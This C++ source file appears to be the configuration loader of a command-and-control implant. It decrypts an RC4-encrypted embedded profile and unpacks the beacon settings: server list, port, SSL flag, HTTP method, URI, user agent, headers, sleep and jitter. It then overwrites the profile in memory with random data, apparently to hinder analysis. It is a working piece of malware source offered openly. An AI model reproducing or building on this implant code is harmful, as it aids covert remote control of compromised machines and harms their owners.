#include "AgentConfig.h"
#include "Packer.h"
#include "Crypt.h"
#include "utils.h"
#include "config.h"

AgentConfig::AgentConfig()
{
	ULONG length  = 0;
	ULONG size    = getProfileSize();
	CHAR* profile = (CHAR*) MemAllocLocal(size);
	memcpy(profile, getProfile(), size);

	Packer* packer = (Packer*)MemAllocLocal(sizeof(Packer));
	*packer = Packer( (BYTE*)profile, size);
	ULONG profileSize = packer->Unpack32();

	encrypt_key = (PBYTE) MemAllocLocal(16);
	memcpy(encrypt_key, packer->GetData() + 4 + profileSize, 16);

	DecryptRC4(packer->GetData()+4, profileSize, encrypt_key, 16);
	
	agent_type    = packer->Unpack32();
	use_ssl       = packer->Unpack8();
	port          = packer->Unpack32();
	servers_count = packer->Unpack32();
	servers = (BYTE**) MemAllocLocal( servers_count * sizeof(LPVOID) );
	for (int i = 0; i < servers_count; i++) {
		servers[i] = packer->UnpackBytesCopy(&length);
	}

	http_method  = packer->UnpackBytesCopy(&length);
	uri          = packer->UnpackBytesCopy(&length);
	parameter    = packer->UnpackBytesCopy(&length);
	user_agent   = packer->UnpackBytesCopy(&length);
	http_headers = packer->UnpackBytesCopy(&length);
	ans_pre_size = packer->Unpack32();
	ans_size     = packer->Unpack32() + ans_pre_size;
	sleep_delay  = packer->Unpack32();
	jitter_delay = packer->Unpack32();

	download_chunk_size = 0x19000;

	MemFreeLocal((LPVOID*)&packer, sizeof(Packer));
	for (int i = 0; i < size; i++)
		profile[i] = GenerateRandom32();
}